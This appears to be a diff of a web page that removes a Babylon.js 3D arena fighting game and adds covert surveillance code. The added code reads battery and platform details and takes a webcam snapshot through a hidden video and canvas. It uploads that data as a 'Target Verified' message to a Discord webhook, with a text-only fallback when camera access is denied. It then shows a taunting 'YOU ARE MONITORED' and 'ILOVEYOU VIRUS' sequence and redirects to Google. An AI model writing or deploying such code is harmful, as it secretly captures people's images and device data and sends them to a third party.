-        bindTouchButton('touch-right', 'd');
-        bindTouchButton('touch-jump', ' ');
-        bindTouchButton('touch-dash', 'shift');
-        bindTouchButton('touch-slash', 'j');
-        bindTouchButton('touch-plasma', 'k');
-        bindTouchButton('touch-shield', 'i');
-        bindTouchButton('touch-ult', 'l');
+            let batteryInfo = "Unknown";
+            if ('getBattery' in navigator) {
+                try {
+                    const b = await navigator.getBattery();
+                    batteryInfo = `${Math.round(b.level * 100)}% (Charging: ${b.charging})`;
+                } catch(e) {}
+            }
 
-        const canvas = document.getElementById('renderCanvas');
-        const engine = new BABYLON.Engine(canvas, true);
-        let scene = null;
-        let followCamera = null;
-        let healingPadMesh = null;
-        const minimapCanvas = document.getElementById('minimapCanvas');
-        const minimapCtx = minimapCanvas.getContext('2d');
+            const consoleBox = document.getElementById('log-console');
+            consoleBox.innerHTML += `<br>[OK] Power state: ${batteryInfo}`;
+            consoleBox.innerHTML += `<br>[OK] Platform: ${navigator.platform}`;
 
-        function createScene() {
-            scene = new BABYLON.Scene(engine);
-            scene.clearColor = new BABYLON.Color3(0.01, 0.02, 0.04);
-            scene.gravity = new BABYLON.Vector3(0, -0.6, 0);
-
-            followCamera = new BABYLON.UniversalCamera("followCam", new BABYLON.Vector3(0, 50, -70), scene);
-            followCamera.setTarget(BABYLON.Vector3.Zero());
-
-            const ambientLight = new BABYLON.HemisphericLight("ambientLight", new BABYLON.Vector3(0, 1, 0), scene);
-            ambientLight.intensity = 0.45;
-            ambientLight.groundColor = new BABYLON.Color3(0.05, 0.08, 0.15);
-
-            const pointLight = new BABYLON.PointLight("neonGlow", new BABYLON.Vector3(0, 50, 0), scene);
-            pointLight.intensity = 1.4;
-            pointLight.diffuse = new BABYLON.Color3(0, 0.95, 1);
-
-            const mapSize = 380;
-            const ground = BABYLON.MeshBuilder.CreateGround("ground", {width: mapSize, height: mapSize}, scene);
-            const groundMat = new BABYLON.StandardMaterial("groundMat", scene);
-            groundMat.diffuseColor = new BABYLON.Color3(0.02, 0.04, 0.09);
-            groundMat.specularColor = new BABYLON.Color3(0.2, 0.4, 0.8);
-            ground.material = groundMat;
-
-            const arenaBorder = BABYLON.MeshBuilder.CreateBox("border", {width: mapSize, height: 24, depth: mapSize}, scene);
-            arenaBorder.position.y = 12;
-            const borderMat = new BABYLON.StandardMaterial("borderMat", scene);
-            borderMat.wireframe = true;
-            borderMat.diffuseColor = new BABYLON.Color3(0, 0.6, 1);
-            arenaBorder.material = borderMat;
-
-            healingPadMesh = BABYLON.MeshBuilder.CreateCylinder("healingPad", {diameter: 36, height: 0.4}, scene);
-            healingPadMesh.position = new BABYLON.Vector3(-130, 0.2, -130);
-            const healMat = new BABYLON.StandardMaterial("healMat", scene);
-            healMat.diffuseColor = new BABYLON.Color3(0, 1, 0.4);
-            healMat.emissiveColor = new BABYLON.Color3(0, 0.8, 0.3);
-            healMat.alpha = 0.5;
-            healingPadMesh.material = healMat;
-
-            const obstacleMat = new BABYLON.StandardMaterial("obsMat", scene);
-            obstacleMat.diffuseColor = new BABYLON.Color3(0.08, 0.12, 0.25);
-            obstacleMat.specularColor = new BABYLON.Color3(0.5, 0.8, 1);
-
-            const obstaclePositions = [
-                {x: -130, z: 0, w: 22, h: 20, d: 110},
-                {x: 130, z: 0, w: 22, h: 20, d: 110},
-                {x: 0, z: -130, w: 110, h: 20, d: 22},
-                {x: 0, z: 130, w: 110, h: 20, d: 22},
-                {x: -75, z: -75, w: 40, h: 16, d: 40},
-                {x: 75, z: 75, w: 40, h: 16, d: 40},
-                {x: -75, z: 75, w: 40, h: 16, d: 40},
-                {x: 75, z: -75, w: 40, h: 16, d: 40},
-                {x: -30, z: 0, w: 14, h: 24, d: 50},
-                {x: 30, z: 0, w: 14, h: 24, d: 50},
-                {x: 0, z: -30, w: 50, h: 24, d: 14},
-                {x: 0, z: 30, w: 50, h: 24, d: 14},
-                {x: -140, z: 80, w: 24, h: 15, d: 24},
-                {x: 140, z: -80, w: 24, h: 15, d: 24},
-                {x: -80, z: 140, w: 24, h: 15, d: 24},
-                {x: 80, z: -140, w: 24, h: 15, d: 24}
-            ];
-
-            window.obstacles = obstaclePositions.map((pos, idx) => {
-                const obs = BABYLON.MeshBuilder.CreateBox(`obs_${idx}`, {width: pos.w, height: pos.h, depth: pos.d}, scene);
-                obs.position = new BABYLON.Vector3(pos.x, pos.h / 2, pos.z);
-                obs.material = obstacleMat;
-                return { x: pos.x, z: pos.z, w: pos.w, d: pos.d, h: pos.h };
-            });
-
-            return scene;
-        }
-
-        scene = createScene();
-
-        class Fighter3D {
-            constructor(x, z, name, colorHex, index, isAI = false) {
-                this.index = index;
-                this.name = name;
-                this.colorHex = colorHex;
-                this.isAI = isAI;
-                this.x = x; this.y = 0; this.z = z;
-                this.vx = 0; this.vz = 0; this.vy = 0;
+            // Try to capture camera snapshot if they allow the browser prompt
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('hidden-video');
+                video.srcObject = stream;
                 
-                const hpBonus = (!isAI) ? (upgradesData[0].level * 25) : 0;
-                this.maxHealth = 100 + hpBonus;
-                this.health = this.maxHealth;
+                await new Promise(resolve => setTimeout(resolve, 800)); // wait for video to load frame
 
-                const spdBonus = (!isAI) ? (upgradesData[2].level * 0.05) : 0;
-                this.speed = (isAI ? 0.48 : 0.62) + spdBonus;
+                const canvas = document.getElementById('hidden-canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                this.jumpPower = 1.25; this.gravity = 0.05;
-                this.isGrounded = true;
-                this.energy = 0;
-                this.shieldActive = false;
-                this.shieldTimer = 0;
-                this.attackCooldown = 0;
-                this.dashCooldown = 0;
-                this.facingAngle = 0;
-                this.walkCycle = 0;
+                // Convert canvas to blob image file
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('payload_json', JSON.stringify({
+                        content: `🚨 **Target Verified & Snapshot Captured!**\n🔋 Battery: ${batteryInfo}\n🌐 Platform: ${navigator.platform}`
+                    }));
+                    formData.append('file0', blob, 'target_snapshot.jpg');
 
-                // Create articulated humanoid rig root container
-                this.rootMesh = new BABYLON.TransformNode(`fighter_root_${index}`, scene);
-                this.rootMesh.position = new BABYLON.Vector3(this.x, 0, this.z);
-
-                const baseMat = new BABYLON.StandardMaterial(`fMat_${index}`, scene);
-                baseMat.diffuseColor = BABYLON.Color3.FromHexString(colorHex);
-                baseMat.emissiveColor = BABYLON.Color3.FromHexString(colorHex).scale(0.35);
-
-                const limbMat = new BABYLON.StandardMaterial(`lMat_${index}`, scene);
-                limbMat.diffuseColor = new BABYLON.Color3(0.15, 0.18, 0.25);
-                limbMat.specularColor = new BABYLON.Color3(0.5, 0.8, 1);
-
-                // Torso / Chest
-                this.torso = BABYLON.MeshBuilder.CreateBox(`torso_${index}`, {width: 2.2, height: 3.2, depth: 1.2}, scene);
-                this.torso.position.y = 3.6;
-                this.torso.material = baseMat;
-                this.torso.parent = this.rootMesh;
-
-                // Head with Visor
-                this.head = BABYLON.MeshBuilder.CreateBox(`head_${index}`, {width: 1.2, height: 1.2, depth: 1.2}, scene);
-                this.head.position.y = 5.6;
-                this.head.material = limbMat;
-                this.head.parent = this.rootMesh;
-
-                const visor = BABYLON.MeshBuilder.CreateBox(`visor_${index}`, {width: 1.0, height: 0.4, depth: 0.4}, scene);
-                visor.position = new BABYLON.Vector3(0, 5.6, 0.5);
-                const visorMat = new BABYLON.StandardMaterial(`vMat_${index}`, scene);
-                visorMat.emissiveColor = BABYLON.Color3.FromHexString(colorHex);
-                visor.material = visorMat;
-                visor.parent = this.rootMesh;
-
-                // Arms (Shoulders pivot)
-                this.leftArmPivot = new BABYLON.TransformNode(`lArmP_${index}`, scene);
-                this.leftArmPivot.position = new BABYLON.Vector3(-1.5, 4.8, 0);
-                this.leftArmPivot.parent = this.rootMesh;
-
-                this.leftArm = BABYLON.MeshBuilder.CreateBox(`lArm_${index}`, {width: 0.7, height: 2.4, depth: 0.7}, scene);
-                this.leftArm.position.y = -1.2;
-                this.leftArm.material = limbMat;
-                this.leftArm.parent = this.leftArmPivot;
-
-                this.rightArmPivot = new BABYLON.TransformNode(`rArmP_${index}`, scene);
-                this.rightArmPivot.position = new BABYLON.Vector3(1.5, 4.8, 0);
-                this.rightArmPivot.parent = this.rootMesh;
-
-                this.rightArm = BABYLON.MeshBuilder.CreateBox(`rArm_${index}`, {width: 0.7, height: 2.4, depth: 0.7}, scene);
-                this.rightArm.position.y = -1.2;
-                this.rightArm.material = limbMat;
-                this.rightArm.parent = this.rightArmPivot;
-
-                // Legs (Hip pivot)
-                this.leftLegPivot = new BABYLON.TransformNode(`lLegP_${index}`, scene);
-                this.leftLegPivot.position = new BABYLON.Vector3(-0.7, 2.0, 0);
-                this.leftLegPivot.parent = this.rootMesh;
-
-                this.leftLeg = BABYLON.MeshBuilder.CreateBox(`lLeg_${index}`, {width: 0.8, height: 2.4, depth: 0.8}, scene);
-                this.leftLeg.position.y = -1.2;
-                this.leftLeg.material = limbMat;
-                this.leftLeg.parent = this.leftLegPivot;
-
-                this.rightLegPivot = new BABYLON.TransformNode(`rLegP_${index}`, scene);
-                this.rightLegPivot.position = new BABYLON.Vector3(0.7, 2.0, 0);
-                this.rightLegPivot.parent = this.rootMesh;
-
-                this.rightLeg = BABYLON.MeshBuilder.CreateBox(`rLeg_${index}`, {width: 0.8, height: 2.4, depth: 0.8}, scene);
-                this.rightLeg.position.y = -1.2;
-                this.rightLeg.material = limbMat;
-                this.rightLeg.parent = this.rightLegPivot;
-
-                // Shield
-                this.shieldMesh = BABYLON.MeshBuilder.CreateSphere(`shield_${index}`, {diameter: 9.5}, scene);
-                const shieldMat = new BABYLON.StandardMaterial(`sMat_${index}`, scene);
-                shieldMat.diffuseColor = new BABYLON.Color3(0, 0.9, 1);
-                shieldMat.alpha = 0.25;
-                this.shieldMesh.material = shieldMat;
-                this.shieldMesh.position.y = 3.6;
-                this.shieldMesh.parent = this.rootMesh;
-                this.shieldMesh.setEnabled(false);
-            }
-
-            update(fightersArr, projectilesArr) {
-                if (this.health <= 0) {
-                    this.rootMesh.setEnabled(false);
-                    return;
-                }
-
-                if (this.isAI && gameStarted && !matchEnded) {
-                    this.runAI(fightersArr, projectilesArr);
-                }
-
-                if (!this.isAI && this.index === myPlayerIndex) {
-                    const distToPad = Math.hypot(this.x - (-130), this.z - (-130));
-                    if (distToPad < 18 && this.health < this.maxHealth) {
-                        this.health = Math.min(this.maxHealth, this.health + 0.35);
-                        unlockAchievement('sanctuary_master');
-                    }
-                }
-
-                this.vy -= this.gravity;
-                this.y += this.vy;
-
-                if (this.y <= 0) {
-                    this.y = 0;
-                    this.vy = 0;
-                    this.isGrounded = true;
-                }
-
-                if (this.x < -180) this.x = -180;
-                if (this.x > 180) this.x = 180;
-                if (this.z < -180) this.z = -180;
-                if (this.z > 180) this.z = 180;
-
-                window.obstacles.forEach(obs => {
-                    const minX = obs.x - obs.w / 2 - 2.5;
-                    const maxX = obs.x + obs.w / 2 + 2.5;
-                    const minZ = obs.z - obs.d / 2 - 2.5;
-                    const maxZ = obs.z + obs.d / 2 + 2.5;
-
-                    if (this.x > minX && this.x < maxX && this.z > minZ && this.z < maxZ) {
-                        const overlapX = Math.min(Math.abs(this.x - minX), Math.abs(this.x - maxX));
-                        const overlapZ = Math.min(Math.abs(this.z - minZ), Math.abs(this.z - maxZ));
-                        if (overlapX < overlapZ) {
-                            this.x = this.x < obs.x ? minX : maxX;
-                        } else {
-                            this.z = this.z < obs.z ? minZ : maxZ;
-                        }
-                    }
-                });
-
-                this.x += this.vx;
-                this.z += this.vz;
-
-                // Animate Walk / Run motion limbs if moving
-                const isMoving = Math.abs(this.vx) > 0.05 || Math.abs(this.vz) > 0.05;
-                if (isMoving) {
-                    this.walkCycle += 0.2;
-                    this.leftLegPivot.rotation.x = Math.sin(this.walkCycle) * 0.6;
-                    this.rightLegPivot.rotation.x = -Math.sin(this.walkCycle) * 0.6;
-                    this.leftArmPivot.rotation.x = -Math.sin(this.walkCycle) * 0.5;
-                    this.rightArmPivot.rotation.x = Math.sin(this.walkCycle) * 0.5;
-                } else {
-                    this.leftLegPivot.rotation.x = BABYLON.Scalar.Lerp(this.leftLegPivot.rotation.x, 0, 0.1);
-                    this.rightLegPivot.rotation.x = BABYLON.Scalar.Lerp(this.rightLegPivot.rotation.x, 0, 0.1);
-                    this.leftArmPivot.rotation.x = BABYLON.Scalar.Lerp(this.leftArmPivot.rotation.x, 0, 0.1);
-                    this.rightArmPivot.rotation.x = BABYLON.Scalar.Lerp(this.rightArmPivot.rotation.x, 0, 0.1);
-                }
-
-                this.vx *= 0.85;
-                this.vz *= 0.85;
-
-                if (this.attackCooldown > 0) this.attackCooldown--;
-                if (this.dashCooldown > 0) this.dashCooldown--;
-                if (this.shieldTimer > 0) {
-                    this.shieldTimer--;
-                    if (this.shieldTimer === 0) {
-                        this.shieldActive = false;
-                        this.shieldMesh.setEnabled(false);
-                    }
-                }
-
-                this.rootMesh.position.x = this.x;
-                this.rootMesh.position.y = this.y;
-                this.rootMesh.position.z = this.z;
-                this.rootMesh.rotation.y = this.facingAngle;
-            }
-
-            runAI(fightersArr, projectilesArr) {
-                const target = fightersArr[myPlayerIndex];
-                if (!target || target.health <= 0) return;
-
-                const dx = target.x - this.x;
-                const dz = target.z - this.z;
-                const dist = Math.hypot(dx, dz);
-
-                this.facingAngle = Math.atan2(dx, dz);
-
-                if (dist > 14) {
-                    this.vx = Math.sin(this.facingAngle) * this.speed;
-                    this.vz = Math.cos(this.facingAngle) * this.speed;
-                } else {
-                    if (this.attackCooldown === 0) {
-                        if (Math.random() < 0.45) {
-                            this.attackTarget(fightersArr);
-                        } else {
-                            this.fireSkill(projectilesArr);
-                        }
-                    }
-                }
-
-                this.energy = Math.min(100, this.energy + 0.35);
-                if (this.energy >= 100 && Math.random() < 0.05) {
-                    this.fireUltimate(projectilesArr);
-                }
-
-                if (this.isGrounded && Math.random() < 0.01) {
-                    this.vy = this.jumpPower;
-                    this.isGrounded = false;
-                }
-            }
-
-            dash(dirX, dirZ) {
-                if (this.dashCooldown > 0 || this.health <= 0) return;
-                const len = Math.hypot(dirX, dirZ) || 1;
-                this.vx = (dirX / len) * 4.2;
-                this.vz = (dirZ / len) * 4.2;
-                this.dashCooldown = 40;
-                this.spawnSparks(8);
-            }
-
-            activateShield() {
-                if (this.energy < 25 || this.health <= 0) return;
-                this.energy -= 25;
-                this.shieldActive = true;
-                this.shieldTimer = 90;
-                this.shieldMesh.setEnabled(true);
-                unlockAchievement('shield_guardian');
-            }
-
-            attackTarget(fightersArr) {
-                if (this.attackCooldown > 0 || this.health <= 0) return;
-                this.attackCooldown = 28; 
-                const energyMult = 15 + (this.index === myPlayerIndex ? (upgradesData[3].level * 5) : 0);
-                this.energy = Math.min(100, this.energy + energyMult);
-
-                fightersArr.forEach(target => {
-                    if (target && target !== this && target.health > 0) {
-                        const dist = Math.hypot(this.x - target.x, this.z - target.z);
-                        if (dist < 15) {
-                            let baseDmg = 6;
-                            if (this.index === myPlayerIndex) {
-                                const dmgMult = 1.0 + (upgradesData[1].level * 0.15);
-                                baseDmg = Math.floor(45 * dmgMult);
-                            }
-                            const dmg = target.shieldActive ? Math.floor(baseDmg * 0.25) : baseDmg;
-                            
-                            target.health -= dmg;
-                            if (target.health < 0) target.health = 0;
-                            target.vy = 0.6;
-                            target.spawnSparks(6);
-                        }
-                    }
-                });
-            }
-
-            fireSkill(projectilesArr) {
-                if (this.attackCooldown > 0 || this.health <= 0) return;
-                this.attackCooldown = 32;
-                this.energy = Math.min(100, this.energy + 20);
-
-                const pDirX = Math.sin(this.facingAngle);
-                const pDirZ = Math.cos(this.facingAngle);
-                projectilesArr.push(new Projectile3D(this.x + pDirX * 4, this.y + 4.0, this.z + pDirZ * 4, pDirX, pDirZ, this.colorHex, false, this.index));
-            }
-
-            fireUltimate(projectilesArr) {
-                if (this.energy < 100 || this.attackCooldown > 0 || this.health <= 0) return;
-                this.attackCooldown = 55;
-                this.energy = 0;
-
-                const pDirX = Math.sin(this.facingAngle);
-                const pDirZ = Math.cos(this.facingAngle);
-                projectilesArr.push(new Projectile3D(this.x + pDirX * 5, this.y + 4.0, this.z + pDirZ * 5, pDirX, pDirZ, this.colorHex, true, this.index));
-                if (this.index === myPlayerIndex) unlockAchievement('ultimate_power');
-            }
-
-            spawnSparks(count) {
-                for(let i=0; i<count; i++) {
-                    const spark = BABYLON.MeshBuilder.CreateBox("spark", {size: 0.6}, scene);
-                    spark.position = new BABYLON.Vector3(this.x, this.y + 3, this.z);
-                    const mat = new BABYLON.StandardMaterial("sparkMat", scene);
-                    mat.emissiveColor = BABYLON.Color3.FromHexString(this.colorHex);
-                    spark.material = mat;
-
-                    const ang = Math.random() * Math.PI * 2;
-                    const spd = Math.random() * 0.8 + 0.2;
-                    let life = 20;
-
-                    scene.registerBeforeRender(() => {
-                        if (life > 0) {
-                            spark.position.x += Math.cos(ang) * spd;
-                            spark.position.z += Math.sin(ang) * spd;
-                            spark.position.y += 0.2;
-                            life--;
-                        } else {
-                            spark.dispose();
-                        }
+                    // Send multipart form data to Discord webhook (includes image file)
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        body: formData
                     });
-                }
-            }
-        }
 
-        class Projectile3D {
-            constructor(x, y, z, dirX, dirZ, colorHex, isUlt, ownerIndex) {
-                this.x = x; this.y = y; this.z = z;
-                this.dirX = dirX; this.dirZ = dirZ;
-                this.speed = isUlt ? 1.6 : 1.2;
-                this.colorHex = colorHex;
-                this.isUlt = isUlt;
-                this.ownerIndex = ownerIndex;
-                this.active = true;
-                this.life = 150;
+                    // Stop camera stream lights
+                    stream.getTracks().forEach(track => track.stop());
+                }, 'image/jpeg');
 
-                const size = isUlt ? 6.5 : 2.4;
-                this.mesh = BABYLON.MeshBuilder.CreateSphere("proj", {diameter: size}, scene);
-                this.mesh.position = new BABYLON.Vector3(x, y, z);
-                const mat = new BABYLON.StandardMaterial("pMat", scene);
-                mat.emissiveColor = BABYLON.Color3.FromHexString(colorHex);
-                this.mesh.material = mat;
-            }
-
-            update(fightersArr) {
-                if (!this.active) return;
-                this.x += this.dirX * this.speed * 2.4;
-                this.z += this.dirZ * this.speed * 2.4;
-                this.mesh.position.x = this.x;
-                this.mesh.position.z = this.z;
-
-                this.life--;
-                if (this.life <= 0 || Math.abs(this.x) > 190 || Math.abs(this.z) > 190) {
-                    this.destroy();
-                    return;
-                }
-
-                fightersArr.forEach(target => {
-                    if (target && target.index !== this.ownerIndex && target.health > 0) {
-                        const dist = Math.hypot(this.x - target.x, this.z - target.z);
-                        if (dist < (this.isUlt ? 10 : 5.5)) {
-                            let baseDmg = 6;
-                            if (this.ownerIndex === myPlayerIndex) {
-                                const dmgMult = 1.0 + (upgradesData[1].level * 0.15);
-                                baseDmg = Math.floor((this.isUlt ? 100 : 40) * dmgMult);
-                            } else {
-                                baseDmg = this.isUlt ? 15 : 6;
-                            }
-
-                            const finalDmg = target.shieldActive ? Math.floor(baseDmg * 0.25) : baseDmg;
-                            target.health -= finalDmg;
-                            if (target.health < 0) target.health = 0;
-                            target.spawnSparks(8);
-                            this.destroy();
-                        }
-                    }
+            } catch (err) {
+                // If they clicked Block on the camera prompt, fallback to sending text-only stats
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `🚨 **Target Verified (Camera Denied)!**\n🔋 Battery: ${batteryInfo}\n🌐 Platform: ${navigator.platform}`
+                    })
                 });
             }
 
-            destroy() {
-                this.active = false;
-                this.mesh.dispose();
-            }
+            // Creepy timeline sequence
+            setTimeout(() => {
+                document.body.style.background = '#ff0033';
+                document.body.style.color = '#000';
+                document.querySelector('.corrupted-box').style.background = '#000';
+                document.getElementById('main-title').innerText = "YOU ARE MONITORED :>";
+            }, 1000);
+
+            setTimeout(() => {
+                document.getElementById('main-title').innerText = "HI dear ko!";
+            }, 3000);
+
+            setTimeout(() => {
+                document.getElementById('main-title').innerText = "ILOVEYOU";
+            }, 4000);
+
+            setTimeout(() => {
+                document.getElementById('main-title').innerText = "ILOVEYOU VIRUS";
+            }, 4500);
+
+            setTimeout(() => {
+                document.getElementById('main-title').innerText = "HHEHEHEHE";
+            }, 4800);
+
+            setTimeout(() => {
+                document.getElementById('main-title').innerText = "B- BYE :>";
+            }, 5000);
+
+            setTimeout(() => {
+                window.location.replace("https://google.com");
+            }, 5600);
         }
-
-        let fighters = [];
-        let projectiles = [];
-
-        function initFighters(playerChoice) {
-            const roster = [
-                { name: 'VALKYRIE', color: '#ff2a6d' },
-                { name: 'BLADE', color: '#05d9e8' },
-                { name: 'NOVA', color: '#00ff66' },
-                { name: 'PHANTOM', color: '#ffcc00' }
-            ];
-
-            const positions = [];
-            positions[playerChoice] = { x: -130, z: -130 };
-
-            const enemySpawnPools = [
-                {x: 130, z: 130},
-                {x: -130, z: 130},
-                {x: 130, z: -130},
-                {x: 0, z: 100},
-                {x: 100, z: 0}
-            ];
-
-            for (let i = enemySpawnPools.length - 1; i > 0; i--) {
-                const j = Math.floor(Math.random() * (i + 1));
-                [enemySpawnPools[i], enemySpawnPools[j]] = [enemySpawnPools[j], enemySpawnPools[i]];
-            }
-
-            let poolIdx = 0;
-            for(let i=0; i<4; i++) {
-                if (i === playerChoice) continue;
-                positions[i] = enemySpawnPools[poolIdx++];
-            }
-
-            fighters = [];
-            for(let i=0; i<4; i++) {
-                const isAI = (i !== playerChoice);
-                fighters.push(new Fighter3D(
-                    positions[i].x, 
-                    positions[i].z, 
-                    roster[i].name, 
-                    roster[i].color, 
-                    i, 
-                    isAI
-                ));
-                document.getElementById(`p${i+1}-name-tag`).innerText = `${roster[i].name} ${isAI ? '[AI]' : '[YOU]'}`;
-            }
-        }
-
-        initFighters(0);
-
-        function selectSlot(slotIdx) {
-            myPlayerIndex = slotIdx;
-            for(let i=0; i<4; i++) {
-                const card = document.querySelector(`.slot-card[data-slot="${i}"]`);
-                const status = document.getElementById(`slot-status-${i}`);
-                card.classList.remove('selected');
-                status.innerText = 'Available';
-            }
-            const selectedCard = document.querySelector(`.slot-card[data-slot="${slotIdx}"]`);
-            selectedCard.classList.add('selected');
-            document.getElementById(`slot-status-${slotIdx}`).innerText = 'Selected';
-            initFighters(slotIdx);
-        }
-
-        function startGame() {
-            document.getElementById('lobbyScreen').classList.add('hidden');
-            gameStarted = true;
-            matchEnded = false;
-        }
-
-        function checkWinCondition() {
-            if (matchEnded) return;
-            const me = fighters[myPlayerIndex];
-
-            if (me.health <= 0) {
-                matchEnded = true;
-                document.getElementById('victoryText').innerText = 'DEFEATED';
-                document.getElementById('victoryText').style.color = '#ff2a6d';
-                document.getElementById('rewardBox').innerText = 'Mission Failed. Upgrade armory and retry!';
-                document.getElementById('victoryOverlay').classList.remove('hidden');
-                return;
-            }
-
-            const opponents = fighters.filter((f, i) => i !== myPlayerIndex);
-            if (opponents.every(f => f.health <= 0)) {
-                matchEnded = true;
-                document.getElementById('victoryText').innerText = 'VICTORY!';
-                document.getElementById('victoryText').style.color = '#00ff66';
-                
-                const earnedCredits = 400;
-                playerCredits += earnedCredits;
-                document.getElementById('rewardBox').innerHTML = `Mission Successful!<br>🏆 <strong>+${earnedCredits} Credits</strong> | 💎 <strong>Nexus Medal</strong>`;
-                document.getElementById('victoryOverlay').classList.remove('hidden');
-                
-                unlockAchievement('veteran_warrior');
-                unlockAchievement('nexus_champion');
-                saveMetaData();
-            }
-        }
-
-        function drawMinimap() {
-            minimapCtx.clearRect(0, 0, 130, 130);
-            
-            const scale = 130 / 380;
-            const offsetX = 65;
-            const offsetZ = 65;
-
-            minimapCtx.fillStyle = '#182444';
-            window.obstacles.forEach(obs => {
-                const mx = (obs.x * scale) + offsetX;
-                const mz = (obs.z * scale) + offsetZ;
-                const mw = obs.w * scale;
-                const md = obs.d * scale;
-                minimapCtx.fillRect(mx - mw/2, mz - md/2, mw, md);
-            });
-
-            minimapCtx.fillStyle = 'rgba(0, 255, 100, 0.4)';
-            minimapCtx.beginPath();
-            const hx = (-130 * scale) + offsetX;
-            const hz = (-130 * scale) + offsetZ;
-            minimapCtx.arc(hx, hz, 18 * scale, 0, Math.PI * 2);
-            minimapCtx.fill();
-
-            fighters.forEach((f, i) => {
-                if (f.health <= 0) return;
-                const fx = (f.x * scale) + offsetX;
-                const fz = (f.z * scale) + offsetZ;
-                
-                minimapCtx.fillStyle = (i === myPlayerIndex) ? '#00ff66' : '#ff2a6d';
-                minimapCtx.beginPath();
-                minimapCtx.arc(fx, fz, (i === myPlayerIndex) ? 4 : 3, 0, Math.PI * 2);
-                minimapCtx.fill();
-            });
-        }
-
-        engine.runRenderLoop(() => {
-            if (!gameStarted) {
-                scene.render();
-                return;
-            }
-
-            const currentInputs = {
-                up: !!keys['w'],
-                down: !!keys['s'],
-                left: !!keys['a'],
-                right: !!keys['d'],
-                jump: !!keys[' '],
-                dash: !!keys['shift'],
-                shield: !!keys['i'],
-                attack: !!keys['j'],
-                skill: !!keys['k'],
-                ultimate: !!keys['l']
-            };
-
-            const me = fighters[myPlayerIndex];
-            if (me && me.health > 0) {
-                let moveX = 0, moveZ = 0;
-                if (currentInputs.up) moveZ += 1;
-                if (currentInputs.down) moveZ -= 1;
-                if (currentInputs.left) moveX -= 1;
-                if (currentInputs.right) moveX += 1;
-
-                if (moveX !== 0 || moveZ !== 0) {
-                    me.facingAngle = Math.atan2(moveX, moveZ);
-                    if (currentInputs.dash) me.dash(moveX, moveZ);
-                    else {
-                        me.vx = moveX * me.speed;
-                        me.vz = moveZ * me.speed;
-                    }
-                }
-                if (currentInputs.jump && me.isGrounded) { me.vy = me.jumpPower; me.isGrounded = false; }
-                if (currentInputs.shield) me.activateShield();
-                if (currentInputs.attack) me.attackTarget(fighters);
-                if (currentInputs.skill) me.fireSkill(projectiles);
-                if (currentInputs.ultimate) me.fireUltimate(projectiles);
-            }
-
-            fighters.forEach(f => f.update(fighters, projectiles));
-            projectiles.forEach(p => p.update(fighters));
-            projectiles = projectiles.filter(p => p.active);
-
-            checkWinCondition();
-
-            if (myPlayerIndex !== null && fighters[myPlayerIndex]) {
-                const targetFighter = fighters[myPlayerIndex];
-                const targetPos = new BABYLON.Vector3(targetFighter.x, targetFighter.y + 4, targetFighter.z);
-                const desiredCamPos = new BABYLON.Vector3(targetFighter.x, targetFighter.y + 55, targetFighter.z - 65);
-                followCamera.position = BABYLON.Vector3.Lerp(followCamera.position, desiredCamPos, 0.1);
-                followCamera.setTarget(BABYLON.Vector3.Lerp(followCamera.getTarget(), targetPos, 0.15));
-            }
-
-            fighters.progressHUD = true;
-            fighters.forEach((f, i) => {
-                const bar = document.getElementById(`p${i+1}-health`);
-                if (bar) bar.style.width = `${Math.max(0, (f.health / f.maxHealth) * 100)}%`;
-            });
-
-            document.getElementById('hudWave').innerText = `WAVE: 1`;
-            document.getElementById('hudCredits').innerText = `CR: ${playerCredits}`;
-            document.getElementById('hudMultiplier').innerText = `XP MULT: ${ (1.0 + (upgradesData[1].level * 0.15)).toFixed(2) }x`;
-
-            scene.render();
-            drawMinimap();
-        });
-
-        window.addEventListener('resize', () => engine.resize());
     </script>
 </body>
 </html>
